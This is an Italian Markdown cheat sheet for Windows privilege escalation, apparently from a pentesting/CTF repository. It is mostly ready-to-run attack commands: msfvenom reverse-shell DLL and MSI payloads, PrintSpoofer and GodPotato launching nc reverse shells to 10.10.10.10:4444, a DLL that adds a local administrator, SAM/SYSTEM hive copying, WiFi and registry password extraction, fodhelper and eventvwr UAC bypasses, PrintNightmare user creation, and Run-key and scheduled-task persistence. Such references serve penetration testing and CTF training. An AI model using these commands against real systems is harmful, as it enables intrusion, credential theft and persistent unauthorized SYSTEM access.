# 🪟 Escalation dei privilegi su Windows — scheda di riferimento completa

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Windows PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Guida completa all’escalation dei privilegi sui sistemi Windows</b>
</p>

> **Nota sulla compatibilità:** build, patch, privilegi, ACL e possibilità di riavvio dei servizi determinano l’applicabilità degli esempi. WMIC è deprecato e non è disponibile in tutte le versioni recenti ([Microsoft](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic)); `Get-WmiObject` è legato a Windows PowerShell e `Get-ModifiableService` richiede strumenti esterni. Le righe `#` nei blocchi `cmd` sono annotazioni del documento, non commenti validi di cmd.exe; il blocco DLL mescola un comando shell e codice C. `AlwaysInstallElevated` richiede entrambi i valori di policy come [documentato da Microsoft](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated). Le etichette Potato sono indicative e non garantiscono il supporto di tutte le build elencate: verifica prerequisiti e ambienti documentati nel progetto [JuicyPotato](https://github.com/ohpe/juicy-potato). La presenza dello Spooler non dimostra PrintNightmare e `CVE-2021-1675` non è sinonimo di `CVE-2021-34527`; la tabella “kernel” include classi diverse di vulnerabilità e “All” non significa ogni sistema aggiornato. Le copie dirette di hive in uso possono fallire e le voci AutoRun non implicano automaticamente elevazione. Gli esempi restano quelli dell’originale.

---

## 📋 Indice

- [Enumerazione](#-enumerazione)
- [Sfruttamento dei servizi](#-sfruttamento-dei-servizi)
- [Percorsi dei servizi senza virgolette](#-percorsi-dei-servizi-senza-virgolette)
- [Dirottamento delle DLL (DLL hijacking)](#-dirottamento-delle-dll-dll-hijacking)
- [AlwaysInstallElevated](#-alwaysinstallelevated)
- [Credenziali memorizzate](#-credenziali-memorizzate)
- [Manipolazione dei token](#-manipolazione-dei-token)
- [Attacchi Potato](#-attacchi-potato)
- [Sfruttamento del registro](#-sfruttamento-del-registro)
- [Attività pianificate](#-attività-pianificate)
- [Aggiramento di UAC](#-aggiramento-di-uac)
- [Sfruttamento delle vulnerabilità del kernel](#-sfruttamento-delle-vulnerabilità-del-kernel)
- [Riferimento rapido](#-riferimento-rapido)

---

## 🔍 Enumerazione

### Informazioni sul sistema

```cmd
# Informazioni sul sistema
systeminfo
hostname

# Versione del sistema operativo
ver
wmic os get caption,version,buildnumber

# Architettura
echo %PROCESSOR_ARCHITECTURE%

# Patch e hotfix
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Informazioni sugli utenti

```cmd
# Utente corrente
whoami
whoami /all
whoami /priv
whoami /groups

# Tutti gli utenti
net user
net localgroup administrators

# Dettagli dell'utente
net user username

# Privilegi correnti
whoami /priv
```

### Informazioni di rete

```cmd
# Configurazione IP
ipconfig /all

# Rotte
route print

# Porte aperte
netstat -ano
netstat -an | findstr LISTENING

# Tabella ARP
arp -a

# Cache DNS
ipconfig /displaydns
```

### Processi e servizi

```cmd
# Processi in esecuzione
tasklist
tasklist /svc
wmic process list full

# Servizi
sc query
net start
wmic service list brief

# Driver
driverquery
```

### Enumerazione con PowerShell

```powershell
# Informazioni sul sistema
Get-ComputerInfo

# Utenti
Get-LocalUser
Get-LocalGroupMember Administrators

# Servizi
Get-Service

# Processi
Get-Process

# Software installato
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

## ⚙ Sfruttamento dei servizi

### Individua i servizi vulnerabili

```cmd
# Elenca i servizi
sc query state= all

# Permessi dei servizi
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Verifica un servizio specifico
sc qc servicename
```

### Permessi dei servizi troppo permissivi

```cmd
# Se puoi modificare la configurazione del servizio:
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

### Permessi troppo permissivi sui binari dei servizi

```cmd
# Verifica i permessi del binario
icacls "C:\Program Files\Service\binary.exe"

# Se è scrivibile, sostituiscilo con un binario malevolo
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

### Verifica dei servizi con PowerShell

```powershell
# Ottieni le informazioni sui servizi
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# Individua i servizi modificabili
Get-ModifiableService
```

---

## 📂 Percorsi dei servizi senza virgolette

### Individua i percorsi senza virgolette

```cmd
# Individua i percorsi dei servizi senza virgolette
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

### Sfrutta un percorso senza virgolette

```
# Se il percorso è: C:\Program Files\Vulnerable Service\service.exe
# Windows cerca:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# Posiziona l'eseguibile malevolo:
copy shell.exe "C:\Program Files\Vulnerable.exe"

# Riavvia il servizio
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

## 📚 Dirottamento delle DLL (DLL hijacking)

### Individua le DLL mancanti

```cmd
# Usa Process Monitor per individuare le DLL mancanti
# Filtro: Result = NAME NOT FOUND, il percorso termina con .dll

# Percorsi comuni controllati:
# 1. Directory dell'applicazione
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. Directory corrente
# 5. Directory elencate in PATH
```

### Crea una DLL malevola

```c
// Payload msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// Oppure compila una DLL personalizzata:
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

### Sfruttamento

```cmd
# Copia la DLL in una directory scrivibile del percorso di ricerca
copy evil.dll "C:\Program Files\App\missing.dll"

# Induci l'applicazione a caricare la DLL
# Riavvia il servizio o l'applicazione
```

---

## 📦 AlwaysInstallElevated

### Verifica la vulnerabilità

```cmd
# Entrambi i valori devono essere impostati a 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Sfruttamento

```bash
# Genera un MSI malevolo
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Trasferisci ed esegui
msiexec /quiet /qn /i evil.msi
```

---

## 🔑 Credenziali memorizzate

### Gestione credenziali

```cmd
# Elenca le credenziali memorizzate
cmdkey /list

# Usa le credenziali salvate
runas /savecred /user:Administrator cmd.exe
```

### SAM & SYSTEM

```cmd
# Copia i file SAM (richiede SYSTEM)
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# Dalle copie shadow
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

### Credenziali nel registro

```cmd
# Password di accesso automatico
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Password VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Sessioni PuTTY
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### File contenenti password

```cmd
# Cerca password
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# File di installazione non presidiata
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# Cronologia di PowerShell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Configurazione IIS
type C:\inetpub\wwwroot\web.config
```

### Password WiFi

```cmd
# Elenca i profili
netsh wlan show profiles

# Ottieni la password
netsh wlan show profile name="SSID" key=clear
```

---

## 🎭 Manipolazione dei token

### Verifica i privilegi

```cmd
whoami /priv

# Privilegi potenzialmente pericolosi:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

### SeImpersonatePrivilege

```cmd
# Se SeImpersonatePrivilege è abilitato:
# Usa gli attacchi Potato (JuicyPotato, PrintSpoofer ecc.)

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### SeBackupPrivilege

```cmd
# Può leggere qualsiasi file
# Copia SAM e SYSTEM
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

### SeRestorePrivilege

```cmd
# Può scrivere in qualsiasi percorso
# Sostituisci i file di sistema
```

---

## 🥔 Attacchi Potato

### JuicyPotato (Windows Server 2016/2019)

```cmd
# Richiede SeImpersonatePrivilege o SeAssignPrimaryToken
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

### PrintSpoofer (Windows 10/Server 2016+)

```cmd
# Richiede SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

### GodPotato (Windows 10/11/Server 2019-2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

## 📝 Sfruttamento del registro

### AutoRuns

```cmd
# Verifica i percorsi di esecuzione automatica
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Se è scrivibile, aggiungi una voce malevola
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

### Chiavi di registro dei servizi

```cmd
# Verifica i permessi delle chiavi di registro dei servizi
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# Modifica ImagePath del servizio
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

## ⏰ Attività pianificate

### Elenca le attività pianificate

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### Individua gli script delle attività scrivibili

```cmd
# Se l'attività esegue uno script che puoi modificare:
icacls "C:\Scripts\backup.bat"

# Aggiungi il comando malevolo
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

### Crea un'attività malevola

```cmd
# Se hai il permesso di creare attività
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

## 🛡 Aggiramento di UAC

### Verifica il livello UAC

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Aggiramento tramite Fodhelper

```cmd
# Funziona su Windows 10
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# Pulizia
reg delete HKCU\Software\Classes\ms-settings /f
```

### Aggiramento tramite EventViewer

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

## 💣 Sfruttamento delle vulnerabilità del kernel

### Verifica le informazioni sul sistema

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Vulnerabilità comuni

| CVE | Versione di Windows | Nome |
|-----|-----------------|------|
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | All | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | All | **PrintNightmare** |

### PrintNightmare (CVE-2021-34527)

```cmd
# Verifica se è vulnerabile
Get-Service Spooler

# Sfruttamento (PowerShell)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

## 📊 Riferimento rapido

### Enumerazione con comandi su una riga

```cmd
# Informazioni rapide
whoami /all & systeminfo & net user

# Verifica i privilegi
whoami /priv

# Servizi
wmic service get name,pathname | findstr /i /v "c:\windows"

# Attività pianificate
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

### Strumenti automatici

| Strumento | Descrizione |
|------|-------------|
| **WinPEAS** | Enumerazione approfondita |
| **PowerUp** | Escalation dei privilegi con PowerShell |
| **Seatbelt** | Controlli di sicurezza |
| **SharpUp** | Controlli di escalation dei privilegi in C# |

### Checklist dei controlli iniziali

- [ ] `whoami /priv` - Verifica SeImpersonate
- [ ] Percorsi dei servizi senza virgolette
- [ ] Binari dei servizi scrivibili
- [ ] AlwaysInstallElevated
- [ ] Credenziali memorizzate (cmdkey /list)
- [ ] Password di accesso automatico nel registro
- [ ] Permessi dei servizi troppo permissivi
- [ ] Script delle attività pianificate
- [ ] Versione del kernel - PrintNightmare?

---

## 📚 Risorse

- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Schede correlate
- [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [Escalation dei privilegi su Linux](../../Linux-PrivEsc/translations/README.it.md)

---

<p align="center">
  <b>🪟 Ottieni l’accesso SYSTEM!</b><br>
  <i>Padroneggia l’escalation dei privilegi su Windows</i>
</p>
